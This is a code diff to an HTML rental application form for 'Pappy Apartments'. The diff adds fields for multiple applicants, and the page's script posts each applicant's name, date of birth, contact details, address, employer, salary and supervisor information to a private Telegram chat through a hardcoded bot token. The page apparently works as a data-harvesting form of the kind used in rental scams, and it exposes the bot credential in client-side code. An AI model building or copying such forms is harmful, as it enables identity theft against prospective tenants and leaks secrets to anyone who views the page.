@@ -124,41 +124,36 @@ label {
   <h2><i class="fas fa-building"></i> Pappy Apartments Application Form</h2>
   <form id="applicationForm">
 
-    <!-- Personal Information -->
-    <h3><i class="fas fa-user"></i> Personal Information</h3>
-    <label>Type of Applicant:</label>
-    <div class="checkbox-group">
-      <label><input type="radio" name="applicant_type" value="Tenant" required> Tenant</label>
-      <label><input type="radio" name="applicant_type" value="Guarantor" required> Guarantor</label>
-    </div>
-    <label>If Guarantor, prospective tenant & relation:</label>
-    <input type="text" name="prospective_tenant" placeholder="John Doe - Brother">
+    <!-- Number of Applicants -->
+    <label>Number of Applicants:</label>
+    <select id="num_applicants" name="num_applicants" required>
+      <option value="1" selected>1 Applicant</option>
+      <option value="2">2 Applicants</option>
+      <option value="3">3 Applicants</option>
+    </select>
 
+    <!-- Primary Applicant -->
+    <h3><i class="fas fa-user"></i> Applicant 1 - Personal Information</h3>
     <label>Full Name:</label>
-    <input type="text" name="full_name" placeholder="Jane Smith" required>
+    <input type="text" name="applicant1_full_name" placeholder="Jane Smith" required>
     <label>Date of Birth:</label>
-    <input type="date" name="dob" required>
-
+    <input type="date" name="applicant1_dob" required>
     <label>Mobile Phone:</label>
-    <input type="tel" name="mobile_phone" placeholder="+1 234 567 8900" required>
-
-    <label>Last 4 of SSN:</label>
-    <input type="text" name="ssn_last4" maxlength="4" pattern="\d{4}" placeholder="1234" required>
-
+    <input type="tel" name="applicant1_mobile_phone" placeholder="+1 234 567 8900" required>
     <label>Email Address:</label>
-    <input type="email" name="email" placeholder="you@example.com" required>
+    <input type="email" name="applicant1_email" placeholder="you@example.com" required>
 
-    <!-- Rental History -->
-    <h3><i class="fas fa-home"></i> Rental History</h3>
+    <!-- Additional Applicants Placeholder -->
+    <div id="additional_applicants"></div>
+
+    <!-- Current Address -->
+    <h3><i class="fas fa-home"></i> Current Address</h3>
     <label>Street Address:</label>
     <input type="text" name="current_street" placeholder="123 Main St" required>
-
     <label>Apt #:</label>
     <input type="text" name="current_apt" placeholder="101">
-
     <label>City:</label>
     <input type="text" name="current_city" id="current_city" placeholder="Start typing your city..." required>
-
     <label>State:</label>
     <select name="current_state" required>
       <option value="">Select State</option>
@@ -213,30 +208,25 @@ label {
       <option value="WI">Wisconsin</option>
       <option value="WY">Wyoming</option>
     </select>
-
     <label>Zip Code:</label>
     <input type="text" name="current_zip" placeholder="12345" required>
+    <label>Reason for Leaving:</label>
+    <textarea name="reason_leaving" rows="2" placeholder="Why are you leaving this address?" required></textarea>
 
-    <!-- Employment History -->
-    <h3><i class="fas fa-briefcase"></i> Employment History</h3>
-    <label>Current Employer:</label>
+    <!-- Current Employment -->
+    <h3><i class="fas fa-briefcase"></i> Current Employment</h3>
+    <label>Employer:</label>
     <input type="text" name="current_employer" placeholder="Company Name" required>
-
     <label>Occupation/Position:</label>
     <input type="text" name="current_position" placeholder="Software Engineer" required>
-
     <label>Work Address:</label>
     <input type="text" name="current_work_address" placeholder="123 Business Rd, City, State" required>
-
     <label>Dates of Employment:</label>
     <input type="text" name="current_employment_dates" placeholder="From MM/DD/YYYY to MM/DD/YYYY" required>
-
     <label>Salary:</label>
     <input type="number" name="current_salary" placeholder="$5000" min="0" required>
-
     <label>Supervisor Name & Title:</label>
     <input type="text" name="current_supervisor" placeholder="Mr. John Doe, Manager" required>
-
     <label>Supervisor Phone:</label>
     <input type="tel" name="current_supervisor_phone" placeholder="+1 234 567 8903" required>
 
@@ -250,8 +240,33 @@ label {
   <div id="response"></div>
 </div>
 
-<!-- Telegram Submission Script -->
+<!-- Scripts -->
 <script>
+// Dynamic additional applicants
+const numApplicants = document.getElementById('num_applicants');
+const additionalDiv = document.getElementById('additional_applicants');
+
+numApplicants.addEventListener('change', () => {
+  additionalDiv.innerHTML = '';
+  const count = parseInt(numApplicants.value);
+  for(let i=2; i<=count; i++){
+    const section = document.createElement('div');
+    section.innerHTML = `
+      <h3><i class="fas fa-user"></i> Applicant ${i} - Personal Information</h3>
+      <label>Full Name:</label>
+      <input type="text" name="applicant${i}_full_name" placeholder="Full Name" required>
+      <label>Date of Birth:</label>
+      <input type="date" name="applicant${i}_dob" required>
+      <label>Mobile Phone:</label>
+      <input type="tel" name="applicant${i}_mobile_phone" placeholder="+1 234 567 890${i}" required>
+      <label>Email Address:</label>
+      <input type="email" name="applicant${i}_email" placeholder="you${i}@example.com" required>
+    `;
+    additionalDiv.appendChild(section);
+  }
+});
+
+// Telegram Submission
 const BOT_TOKEN = "8428652927:AAEUirmhHly-u0E_HYDNdOzWp0m3MsXR_Oc";
 const CHAT_ID = "5590862324"; 
 const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
@@ -279,6 +294,7 @@ document.getElementById("applicationForm").addEventListener("submit", async (e) 
     if(result.ok){
       document.getElementById("response").innerHTML = "<p class='success'>✅ Application sent successfully!</p>";
       form.reset();
+      additionalDiv.innerHTML = '';
     } else {
       document.getElementById("response").innerHTML = "<p class='error'>❌ Failed to send. Check your bot token and chat ID.</p>";
     }
@@ -291,6 +307,5 @@ document.getElementById("applicationForm").addEventListener("submit", async (e) 
   }
 });
 </script>
-
 </body>
 </html>
